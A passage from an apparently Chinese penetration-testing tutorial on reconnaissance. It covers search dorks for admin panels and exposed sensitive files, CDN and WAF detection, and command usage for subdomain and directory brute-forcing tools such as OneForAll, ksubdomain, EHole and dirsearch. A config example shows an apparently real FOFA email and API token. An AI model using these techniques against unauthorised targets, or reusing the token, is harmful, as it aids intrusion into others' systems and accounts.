class="headerlink" title="GooleHack"></a>GooleHack</h5><p><a href="https://cn.bing.com/">https://cn.bing.com/</a></p><p>1.后台地址</p><ul><li>site:xxx.com 管理后台&#x2F;登录&#x2F;管理员&#x2F;系统，可以通过添加双引号增加精确度</li><li>site:xxx.com inurl:login&#x2F;admin&#x2F;system&#x2F;guanli&#x2F;demglu</li></ul><p>2.敏感文件</p><ul><li>site:xxx.com filetype:pdf&#x2F;doc&#x2F;xls&#x2F;txt</li><li>site:xxx.com filetype:log&#x2F;sql.conf</li></ul><p>3.测试环境</p><ul><li>site: xxx.com inurl:test&#x2F;ceshi</li><li>site: xxx.com intitle:测试&#x2F;后台</li></ul><p>4.邮箱&#x2F;QQ&#x2F;群</p><ul><li>site: xxx.com 邮件&#x2F;email</li><li>site: xxx.com qq&#x2F;群&#x2F;企鹅&#x2F;腾讯</li><li>site: xxx.com intitle:”Outlook Web App”  邮件服务器web界面</li><li>site: xxx.com intitle:”mail”</li><li>site: xxx.com intitle:”webmail”</li></ul><p>5.其他</p><ul><li>site:xxx.com inurl:api</li><li>site:xxx.com inurl:uid&#x3D;&#x2F;id&#x3D;</li><li>site:xxx.com intitle:index of “server at”</li></ul><h5 id="历史漏洞信息收集"><a href="#历史漏洞信息收集" class="headerlink" title="历史漏洞信息收集"></a>历史漏洞信息收集</h5><p>在线网站：</p><p>​补天地址：<a href="https://www.butian.net/">https://www.butian.net/</a></p><p>​漏洞银行：<a href="https://m.bugbank.cn/">https://m.bugbank.cn/</a></p><p>​乌云网址：<a href="https://wy.zone.ci/index.php">https://wy.zone.ci/index.php</a></p><p>​CNVD:  <a href="https://www.cnvd.org.cn/">https://www.cnvd.org.cn/</a></p><p>​CNNVD：<a href="http://www.cnnvd.org.cn/">http://www.cnnvd.org.cn</a></p><p>​Seebug：<a href="https://www.seebug.org/">https://www.seebug.org</a></p><p>​Exploit Database：<a href="https://www.exploit-db.com/">https://www.exploit-db.com</a></p><p>​Sploitus：<a href="https://sploitus.com/">https://sploitus.com</a></p><h5 id="网盘引擎"><a href="#网盘引擎" class="headerlink" title="网盘引擎"></a>网盘引擎</h5><ul><li>盘搜搜：<a href="http://www.pansoso.org/">http://www.pansoso.org</a></li><li>盘多多：<a href="http://www.panduoduo.net/">http://www.panduoduo.net</a></li><li>大力盘：<a href="https://dalipan.com/">https://dalipan.com</a></li></ul><h5 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h5><p>​指纹识别就是识别搭建网站的方式（dedecms、wordpress、edusoho、wencenter 、jira）</p><blockquote><p>cms平台        ：完整内容管理平台（适合搭建官方网站）</p><p>dz   平台：论坛</p><p>edusoho       ：线上视频网站</p><p>wecenter      ：线上社交平台</p><p>JIRA:  项目管理平台</p><p>confluence   ：企业内部网盘</p><p>wordpress    ：博客系统</p></blockquote><p>在线网站：</p><ul><li>火狐插件：Wappalyzer</li><li>云悉：<a href="http://www.yunsee.cn/">http://www.yunsee.cn</a></li><li>whatweb：<a href="https://www.whatweb.net/">https://www.whatweb.net</a></li><li>在线：<a href="http://whatweb.bugscaner.com/look">http://whatweb.bugscaner.com/look</a></li><li>Nucle：<a href="https://github.com/projectdiscovery/nuclei">https://github.com/projectdiscovery/nuclei</a></li><li>潮汐：<a href="http://finger.tidesec.net/">http://finger.tidesec.net/</a></li></ul><p>使用御剑增强版也可以识别网站指纹信息</p><h5 id="网站安全程序识别方法"><a href="#网站安全程序识别方法" class="headerlink" title="网站安全程序识别方法"></a>网站安全程序识别方法</h5><p>kali自动集成</p><p><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p><p>进行程序安装：python setup.py install</p><p>软件程序测试： 进入wafw00f目录执行main.py <a href="http://www.safedog.cn/">www.safedog.cn</a></p><h5 id="CDN识别"><a href="#CDN识别" class="headerlink" title="CDN识别"></a>CDN识别</h5><ul><li>通过Ping一个不存在的二级域名获取真实ip或没有挂cdn的域名（主要是通过泛域名解析）</li><li>利用fofa语法title标签获取真实ip</li><li>DNS历史记录<ul><li><a href="https://sitereport.net.craft.com/?url=https://www.oldboyedu.com">https://sitereport.net.craft.com/?url=https://www.oldboyedu.com</a></li></ul></li><li>是否存在phpinfo.php（在phpinfo中的SERVER_ADDR或者SERVER[“”SERVER_ADDR]）找到真实IP</li><li>通过国外VPS Ping</li></ul><p>在线工具</p><p><strong>真实ip</strong></p><ul><li>全球ping：<a href="https://www.wepcc.com/">https://www.wepcc.com</a></li><li>dns检测：<a href="https://tools.ipip.net/dns.php">https://tools.ipip.net/dns.php</a></li><li>Xcdn：<a href="https://github.com/3xp10it/xcdn">https://github.com/3xp10it/xcdn</a></li><li>在线：<a href="https://ipchaxun.com/">https://ipchaxun.com</a></li></ul><h2 id="工具参考"><a href="#工具参考" class="headerlink" title="工具参考"></a>工具参考</h2><h3 id="Dnsenum（DNS域传输漏洞）"><a href="#Dnsenum（DNS域传输漏洞）" class="headerlink" title="Dnsenum（DNS域传输漏洞）"></a>Dnsenum（DNS域传输漏洞）</h3><p>工具介绍：DNS域传送漏洞（KALI）收集一个域的信息，通过谷歌或者字典文件猜测可能存在的域名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">用法</span></span><br><span class="line">dnsenum 【选项】 &lt;域&gt;</span><br><span class="line"></span><br><span class="line">常用选项：</span><br><span class="line">--dnsserver &lt;server&gt;选择解析的DNS服务器</span><br><span class="line">-v 显示详细信息</span><br><span class="line">-f从此文件中读取子域进行暴力破解</span><br><span class="line">--noreverse跳过反向查找操作</span><br></pre></td></tr></table></figure><h3 id="oneForAll-子域名收集器"><a href="#oneForAll-子域名收集器" class="headerlink" title="oneForAll 子域名收集器"></a>oneForAll 子域名收集器</h3><p>项目地址：<a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></p><p>oneforall 依赖安装</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd OneForAll/</span><br><span class="line">python3 -m pip install -U pip setuptools wheel -i https://mirrors.aliyun.com/pypi/simple/</span><br><span class="line">pip3 install -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple/</span><br><span class="line">python3 oneforall.py --<span class="built_in">help</span></span><br></pre></td></tr></table></figure><p>oneforall使用方法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">运行示例</span></span><br><span class="line">python3 oneforall.py --target example.com.cn run</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用字典进行搜集</span></span><br><span class="line">python3 oneforall.py --targets ./example.txt run</span><br></pre></td></tr></table></figure><p>运行结束后会在相应文件夹产生结果文件</p><p><img src="/img/oldboy/1-5.png"></p><blockquote><p>需要python 3.6.0以上环境才能运行</p><p>使用 python 3.11 及以上版本时oneforall会出现一个 cannot import name ‘sre_parse’ from ‘re’ 的报错：</p><p>修复方法</p><p>​pip uninstall exrex </p><p>​pip install exrex</p></blockquote><h3 id="ksubdomain-无状态子域名爆破工具"><a href="#ksubdomain-无状态子域名爆破工具" class="headerlink" title="ksubdomain 无状态子域名爆破工具"></a>ksubdomain 无状态子域名爆破工具</h3><p>工具特点：ksubdomain的发送和接收是分离不依赖系统的，所以速度快</p><p>项目地址：<a href="https://github.com/knownsec/ksubdomain">knownsec&#x2F;ksubdomain: 无状态子域名爆破工具</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">常用命令：</span></span><br><span class="line">使用内置字典爆破</span><br><span class="line">ksubdomain -d seebug.org</span><br><span class="line"></span><br><span class="line">使用字典爆破域名</span><br><span class="line">ksubdomain -d seebug.org -f subdomains.dict</span><br><span class="line"></span><br><span class="line">字典里都是域名，可使用验证模式</span><br><span class="line">ksubdomain -f dns.txt -verify</span><br><span class="line"></span><br><span class="line">爆破三级域名</span><br><span class="line">ksubdomain -d seebug.org -l 2</span><br><span class="line"></span><br><span class="line">通过管道爆破</span><br><span class="line">echo &quot;seebug.org&quot;|ksubdomain</span><br><span class="line"></span><br><span class="line">通过管道验证域名</span><br><span class="line">echo &quot;paper.seebug.org&quot;|ksubdomain -verify</span><br><span class="line"></span><br><span class="line">仅使用网络API接口获取域名</span><br><span class="line">ksubdomain -d seebug.org -api</span><br><span class="line"></span><br><span class="line">完整模式,先使用网络API，在此基础使用内置字典进行爆破</span><br><span class="line">ksubdomain -d seebug.org -full</span><br><span class="line"></span><br><span class="line">Summary整理功能</span><br><span class="line">ksubdomain -d seebug.org -summary</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">相关参数</span></span><br><span class="line">  -api</span><br><span class="line">        使用网络接口</span><br><span class="line">  -b string</span><br><span class="line">        宽带的下行速度，可以5M,5K,5G (default &quot;1M&quot;)</span><br><span class="line">  -check-origin</span><br><span class="line">        会从返回包检查DNS是否为设定的，防止其他包的干扰</span><br><span class="line">  -csv</span><br><span class="line">        输出excel文件</span><br><span class="line">  -d string</span><br><span class="line">        爆破域名</span><br><span class="line">  -dl string</span><br><span class="line">        从文件中读取爆破域名</span><br><span class="line">  -e int</span><br><span class="line">        默认网络设备ID,默认-1，如果有多个网络设备会在命令行中选择 (default -1)</span><br><span class="line">  -f string</span><br><span class="line">        字典路径,-d下文件为子域名字典，-verify下文件为需要验证的域名</span><br><span class="line">  -filter-wild</span><br><span class="line">        自动分析并过滤泛解析，最终输出文件，需要与&#x27;-o&#x27;搭配</span><br><span class="line">  -full</span><br><span class="line">        完整模式，使用网络接口和内置字典</span><br><span class="line">  -l int</span><br><span class="line">        爆破域名层级,默认爆破一级域名 (default 1)</span><br><span class="line">  -list-network</span><br><span class="line">        列出所有网络设备</span><br><span class="line">  -o string</span><br><span class="line">        输出文件路径</span><br><span class="line">  -s string</span><br><span class="line">        resolvers文件路径,默认使用内置DNS</span><br><span class="line">  -sf string</span><br><span class="line">        三级域名爆破字典文件(默认内置)</span><br><span class="line">  -silent</span><br><span class="line">        使用后屏幕将仅输出域名</span><br><span class="line">  -skip-wild</span><br><span class="line">        跳过泛解析的域名</span><br><span class="line">  -summary</span><br><span class="line">        在扫描完毕后整理域名归属asn以及IP段</span><br><span class="line">  -test</span><br><span class="line">        测试本地最大发包数</span><br><span class="line">  -ttl</span><br><span class="line">        导出格式中包含TTL选项</span><br><span class="line">  -verify</span><br><span class="line">        验证模式</span><br></pre></td></tr></table></figure><h3 id="subDomainsBrute-暴力域名枚举工具"><a href="#subDomainsBrute-暴力域名枚举工具" class="headerlink" title="subDomainsBrute 暴力域名枚举工具"></a>subDomainsBrute 暴力域名枚举工具</h3><p>工具特点：高并发的DNS暴力枚举工具，支持Python3.6+和Python2.7，建议使用Python3.8+。</p><p>项目地址：<a href="https://github.com/lijiejie/subDomainsBrute">lijiejie&#x2F;subDomainsBrute: A fast sub domain brute tool for pentesters</a></p><p>使用方法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Usage: subDomainsBrute.py [options] target.com</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  --version             show program&#x27;s version number and exit</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -f FILE               File contains new line delimited subs, default is</span><br><span class="line">                        subnames.txt.</span><br><span class="line">  --full                Full scan, NAMES FILE subnames_full.txt will be used</span><br><span class="line">                        to brute</span><br><span class="line">  -i, --ignore-intranet</span><br><span class="line">                        Ignore domains pointed to private IPs</span><br><span class="line">  -w, --wildcard        Force scan after wildcard test failed</span><br><span class="line">  -t THREADS, --threads=THREADS</span><br><span class="line">                        Num of scan threads, 500 by default</span><br><span class="line">  -p PROCESS, --process=PROCESS</span><br><span class="line">                        Num of scan process, 6 by default</span><br><span class="line">  --no-https            Disable get domain names from HTTPS cert, this can</span><br><span class="line">                        save some time</span><br><span class="line">  -o OUTPUT, --output=OUTPUT</span><br><span class="line">                        Output file name. default is &#123;target&#125;.txt</span><br></pre></td></tr></table></figure><h3 id="Sublist3r-子域名枚举工具"><a href="#Sublist3r-子域名枚举工具" class="headerlink" title="Sublist3r 子域名枚举工具"></a>Sublist3r 子域名枚举工具</h3><p>工具特点：Sublist3r 是一个 python 工具，旨在使用 OSINT 枚举网站的子域。它可以帮助渗透测试人员和错误猎人收集和收集他们所针对的域的子域。Sublist3r 使用许多搜索引擎（如 Google、Yahoo、Bing、Baidu 和 Ask）列举子域。Sublist3r 还使用 Netcraft、Virustotal、ThreatCrowd、DNSdumpster 和 ReverseDNS 枚举子域。</p><p>项目地址：<a href="https://github.com/aboul3la/Sublist3r">aboul3la&#x2F;Sublist3r：用于渗透测试人员的快速子域枚举工具</a></p><p>使用方法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">获取基本选项帮助</span><br><span class="line">python sublist3r.py -h</span><br><span class="line"></span><br><span class="line">要枚举特定域的子域</span><br><span class="line">python sublist3r.py -d example.com</span><br><span class="line"></span><br><span class="line">要枚举特定域的子域并仅显示具有开放端口 80 和 443 的子域 </span><br><span class="line">python sublist3r.py -d example.com -p 80,443</span><br><span class="line"></span><br><span class="line">要枚举子域并启用 bruteforce 模块</span><br><span class="line">python sublist3r.py -b -d example.com</span><br></pre></td></tr></table></figure><p>相关参数</p><p><img src="/img/oldboy/1-6.png"></p><h3 id="Layer-子域名挖掘机"><a href="#Layer-子域名挖掘机" class="headerlink" title="Layer 子域名挖掘机"></a>Layer 子域名挖掘机</h3><p>项目地址：<a href="https://github.com/euphrat1ca/LayerDomainFinder">euphrat1ca&#x2F;LayerDomainFinder: Layer子域名挖掘机</a></p><p><img src="/img/oldboy/1-7.png"></p><p>输入对应的域名直接开始扫描即可</p><h3 id="jsFinder-扫描js文件提取二级域名"><a href="#jsFinder-扫描js文件提取二级域名" class="headerlink" title="jsFinder 扫描js文件提取二级域名"></a>jsFinder 扫描js文件提取二级域名</h3><p>JSFinder是一款用作快速在网站的js文件中提取URL，子域名的工具。</p><p>项目代码：<a href="https://github.com/Threezh1/JSFinder">Threezh1&#x2F;JSFinder: JSFinder is a tool for quickly extracting URLs and subdomains from JS files on a website.</a></p><p>使用方法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">简单爬取（爬取这单个页面的所有js连接，并在其中发现url和子域名）</span></span><br><span class="line">python JSFinder.py -u http://www.mi.com</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">深度爬取（使用-ou和-os 指定保存的URL和子域名的文件名）</span></span><br><span class="line">python JSFinder.py -u http://www.mi.com -d -ou mi_url.txt -os mi_subdomain.txt</span><br></pre></td></tr></table></figure><h3 id="subfinder-子域发现工具"><a href="#subfinder-子域发现工具" class="headerlink" title="subfinder 子域发现工具"></a>subfinder 子域发现工具</h3><p><code>subfinder</code>是一种子域发现工具，它使用被动在线资源返回网站的有效子域。它具有简单的模块化架构，并针对速度进行了优化。 专为 只做一件事 - 被动子域枚举，它做得很好</p><p>项目地址：<a href="https://github.com/projectdiscovery/subfinder?tab=readme-ov-file#running-subfinder">projectdiscovery&#x2F;subfinder: Fast passive subdomain enumeration tool.</a></p><p>使用方法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">Usage:</span><br><span class="line">  ./subfinder [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">INPUT:</span><br><span class="line">  -d, -domain string[]  domains to find subdomains for</span><br><span class="line">  -dL, -list string     file containing list of domains for subdomain discovery</span><br><span class="line"></span><br><span class="line">SOURCE:</span><br><span class="line">  -s, -sources string[]           specific sources to use for discovery (-s crtsh,github). Use -ls to display all available sources.</span><br><span class="line">  -recursive                      use only sources that can handle subdomains recursively (e.g. subdomain.domain.tld vs domain.tld)</span><br><span class="line">  -all                            use all sources for enumeration (slow)</span><br><span class="line">  -es, -exclude-sources string[]  sources to exclude from enumeration (-es alienvault,zoomeyeapi)</span><br><span class="line"></span><br><span class="line">FILTER:</span><br><span class="line">  -m, -match string[]   subdomain or list of subdomain to match (file or comma separated)</span><br><span class="line">  -f, -filter string[]   subdomain or list of subdomain to filter (file or comma separated)</span><br><span class="line"></span><br><span class="line">RATE-LIMIT:</span><br><span class="line">  -rl, -rate-limit int  maximum number of http requests to send per second</span><br><span class="line">  -rls value            maximum number of http requests to send per second for providers in key=value format (-rls &quot;hackertarget=10/s,shodan=15/s&quot;)</span><br><span class="line">  -t int                number of concurrent goroutines for resolving (-active only) (default 10)</span><br><span class="line"></span><br><span class="line">UPDATE:</span><br><span class="line">  -up, -update                 update subfinder to latest version</span><br><span class="line">  -duc, -disable-update-check  disable automatic subfinder update check</span><br><span class="line"></span><br><span class="line">OUTPUT:</span><br><span class="line">  -o, -output string       file to write output to</span><br><span class="line">  -oJ, -json               write output in JSONL(ines) format</span><br><span class="line">  -oD, -output-dir string  directory to write output (-dL only)</span><br><span class="line">  -cs, -collect-sources    include all sources in the output (-json only)</span><br><span class="line">  -oI, -ip                 include host IP in output (-active only)</span><br><span class="line"></span><br><span class="line">CONFIGURATION:</span><br><span class="line">  -config string                flag config file (default &quot;$CONFIG/subfinder/config.yaml&quot;)</span><br><span class="line">  -pc, -provider-config string  provider config file (default &quot;$CONFIG/subfinder/provider-config.yaml&quot;)</span><br><span class="line">  -r string[]                   comma separated list of resolvers to use</span><br><span class="line">  -rL, -rlist string            file containing list of resolvers to use</span><br><span class="line">  -nW, -active                  display active subdomains only</span><br><span class="line">  -proxy string                 http proxy to use with subfinder</span><br><span class="line">  -ei, -exclude-ip              exclude IPs from the list of domains</span><br><span class="line"></span><br><span class="line">DEBUG:</span><br><span class="line">  -silent             show only subdomains in output</span><br><span class="line">  -version            show version of subfinder</span><br><span class="line">  -v                  show verbose output</span><br><span class="line">  -nc, -no-color      disable color in output</span><br><span class="line">  -ls, -list-sources  list all available sources</span><br><span class="line"></span><br><span class="line">OPTIMIZATION:</span><br><span class="line">  -timeout int   seconds to wait before timing out (default 30)</span><br><span class="line">  -max-time int  minutes to wait for enumeration results (default 10)</span><br></pre></td></tr></table></figure><h3 id="EHole棱洞系统指纹探测工具"><a href="#EHole棱洞系统指纹探测工具" class="headerlink" title="EHole棱洞系统指纹探测工具"></a>EHole棱洞系统指纹探测工具</h3><p>EHole是一款对资产中重点系统指纹识别的工具，在红队作战中，信息收集是必不可少的环节，如何才能从大量的资产中提取有用的系统(如OA、VPN、Weblogic…)。EHole旨在帮助红队人员在信息收集期间能够快速从C段、大量杂乱的资产中精准定位到易被攻击的系统，从而实施进一步攻击。</p><p>项目地址：<a href="https://github.com/EdgeSecurityTeam/EHole">EdgeSecurityTeam&#x2F;EHole: EHole(棱洞)3.0 重构版-红队重点攻击系统指纹探测工具</a></p><p>参数信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">E:\tools\collection\EHole_windows_amd64&gt;EHole_windows_amd64.exe finger -h</span><br><span class="line">从fofa或者本地文件获取资产进行指纹识别，支持单条url识别。</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  ehole finger [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">  -f, --fip string      从fofa提取资产，进行指纹识别，仅仅支持ip或者ip段，例如：192.168.1.1 | 192.168.1.0/24</span><br><span class="line">  -s, --fofa string     从fofa提取资产，进行指纹识别，支持fofa所有语法</span><br><span class="line">  -h, --help            help for finger</span><br><span class="line">  -l, --local string    从本地文件读取资产，进行指纹识别，支持无协议，列如：192.168.1.1:9090 | http://192.168.1.1:9090</span><br><span class="line">  -o, --output string   输出所有结果，当前仅支持json和xlsx后缀的文件。</span><br><span class="line">  -p, --proxy string    指定访问目标时的代理，支持http代理和socks5，例如：http://127.0.0.1:8080、socks5://127.0.0.1:8080</span><br><span class="line">  -t, --thread int      指纹识别线程大小。 (default 100)</span><br><span class="line">  -u, --url string      识别单个目标。</span><br><span class="line"></span><br><span class="line">Global Flags:</span><br><span class="line">      --config string   config file (default is $HOME/.ehole.yaml)</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">##############################################################################################</span></span></span><br><span class="line"></span><br><span class="line">E:\tools\collection\EHole_windows_amd64&gt;EHole_windows_amd64.exe fofaext -h</span><br><span class="line">从fofa api提取资产并保存成xlsx，支持大批量ip提取,支持fofa所有语法。</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  ehole fofaext [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">  -s, --fofa string     从fofa提取资产，支持fofa所有语法，默认保存所有结果。</span><br><span class="line">  -h, --help            help for fofaext</span><br><span class="line">  -l, --ipfile string   从文本获取IP，在fofa搜索，支持大量ip，默认保存所有结果。</span><br><span class="line">  -o, --output string   指定输出文件名和位置，当前仅支持xlsx后缀的文件。 (default &quot;results.xlsx&quot;)</span><br><span class="line"></span><br><span class="line">Global Flags:</span><br><span class="line">      --config string   config file (default is $HOME/.ehole.yaml)</span><br></pre></td></tr></table></figure><p>使用方法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">本地识别</span></span><br><span class="line">EHole_windows_amd64.exe finger  -l url.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">url.txt文件格式：</span></span><br><span class="line">http://192.168.100.1:10086/</span><br><span class="line">https://192.168.100.1:10086/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">fofa识别（需要配置FOFA密钥以及邮箱信息，在config.ini内配置好密钥以及邮箱即可使用）</span></span><br><span class="line">Email=om2bg0rl5cgyxdxtj2nhybfedmgo@open_wechat</span><br><span class="line">Fofa_token=7e067ef287ebdb200d523d181cd724bd</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">支持单ip或IP段</span></span><br><span class="line">EHole_windows_amd64.exe finger -f 192.168.1.1</span><br><span class="line">EHole_windows_amd64.exe finger -f 192.168.1.0/24</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将结果输出到指定文件</span></span><br><span class="line">EHole_windows_amd64.exe -l url.txt -json export.json</span><br></pre></td></tr></table></figure><h3 id="dirsearch-Web路径发现"><a href="#dirsearch-Web路径发现" class="headerlink" title="dirsearch Web路径发现"></a>dirsearch Web路径发现</h3><p><img src="/img/oldboy/1-8.png"></p><p><a href="https://so.csdn.net/so/search?q=dirsearch&spm=1001.2101.3001.7020">dirsearch</a>是一个基于python的命令行工具，用于暴力扫描页面结构，包括网页中的目录和文件。</p><p>项目地址：<a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install -r requirements.txt        //安装依赖</span><br></pre></td></tr></table></figure><p>使用方法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u https://target</span><br><span class="line"></span><br><span class="line">python3 dirsearch.py -e php,html,js -u https://target</span><br><span class="line"></span><br><span class="line">python3 dirsearch.py -e php,html,js -u https://target -w /path/to/wordlist</span><br></pre></td></tr></table></figure><p>参数信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-u URL 指定URL目标</span><br><span class="line">-L URLLIST 指定URL列表目标</span><br><span class="line">-eEXTENSIONS指定扩展列表</span><br><span class="line">-R RECURSIVE_LEVEL_MAX 最大递归级别（子目录）（默认值：1[仅限根目录+1目录]）</span><br><span 